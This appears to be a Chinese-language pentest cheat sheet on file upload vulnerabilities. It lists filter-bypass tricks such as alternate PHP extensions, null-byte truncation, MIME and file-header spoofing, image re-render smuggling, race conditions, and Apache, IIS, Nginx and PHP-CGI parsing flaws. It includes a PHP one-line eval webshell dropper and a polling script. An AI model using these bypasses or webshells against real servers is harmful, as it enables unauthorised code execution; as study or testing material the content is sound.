# 文件上传漏洞

文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服务器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够被 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。

## 前端检查

1. 控制台重构检查函数
1. 抓包

## 文件后缀绕过

1. 改为`php5,php4,php3,php2,phtml,pht`
1. 大小写绕过
1. 加空格
1. 加点
1. 加::$DATA
1. 加点+空格+点+空格（`deldot()`删除末尾空格、`trim()`首尾去空）
1. 双写

## 上传路径可控

上传路径+文件名拼接时，上传路径后输入保存文件名并使用 00 截断，GET：%00 截断，POST：00 截断（需要`php`版本小于 5.3.4，`php.ini`的`magic_quotes_gpc`为`OFF`状态）

## Content-Type 绕过

抓包修改 Content-Type

见[HTTP_content-type_对照表](HTTP_content-type_%E5%AF%B9%E7%85%A7%E8%A1%A8.md)

## 文件头检测

添加文件头（GIF89a 等）

## 文件内容检测

参考[PHP命令执行](../PHP/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md)

## 二次渲染

测试图片的渲染后没有修改的位置，将一句话木马添加进去，这样就可以利用文件包含去执行 php 一句话木马了

对于 GIF 的上传，只需要判断没有修改的位置，然后将 php 一句话木马添加即可

对于 PNG 的上传，需要修改 PLTE 数据块或者修改 IDAT 数据块

详见 [制作绕过二次渲染的图片马](https://blog.csdn.net/weixin_45519736/article/details/105775721)

## 条件竞争

针对上传后检测再删除的情况，可用传一个创建一个一句话木马的文件，然后不断访问，直到执行成功。

```php
// upload
<?php
 $file=fopen("muma.php","w");
 $string='<?php @eval($_POST["test"]); ?>';
 fwrite($file,$string);
 fcolse();
?>
```

```python
# run
import requests

for i in range(1000000):
    url="xxx"
    if requests.get(url).status_code == 200 :
        print('yse')
        break
```

## 解析漏洞

### Apache 解析漏洞

在Apache1.x和2.x版本中，Apache可以识别多个文件扩展名。如果文件存在多个扩展名，Apache会从后向前开始解析，如果遇到Apache配置文件中的mime.types没有定义的扩展名，就继续向前解析，直到识别出可以解析的扩展名；如果所有扩展名都无法解析，就会以DeafultType的默认值text/plain将该文件当作文本解析。

例如：`file.php.en`, `file.php.rar`, `file.php.gif`当作PHP文件来解析

### ISS 解析漏洞

1. IIS6.0在处理有分号`;`的文件名时，会截断分号后面的部分，造成解析漏洞。

   - 例如：`test.asp;.jpg`会被当成ASP文件来解析

1. IIS6.0目录解析漏洞：当目录的名称是`.asp`、`.asa`、`.cer`和`.cdx`时，IIS6.0会将目录里任何扩展名的文件都当作ASP文件来执行，造成目录解析漏洞。

1. 旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行

### Nginx 解析漏洞

nginx(0.5.x, 0.6.x, 0.7 <= 0.7.65, 0.8 <= 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）

### PHP CGI 解析漏洞

PHP的配置文件中有一个参数时cgi.fix_pathinfo，如果设置了cgi.fix_pathinfo=1,则在访问`http://www.a.com/path/test.jpg/notexist.php`时，PHP会递归向前解析，如果test.jpg存在，就会把test.jpg当作PHP文件解析，IIS7.x和Nginx中间件解析PHP文件时，默认PHP的配置文件都开启了cgi.fix_pathinfo，导致产生解析漏洞。此时 Nginx 的配置如下

```nginx
location ~ \.php$ {
    root html;
    fastcgi_pass 127.0.0.1:9000;
    fastcgi_index index.php;
    fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
    include fastcgi_param;
}
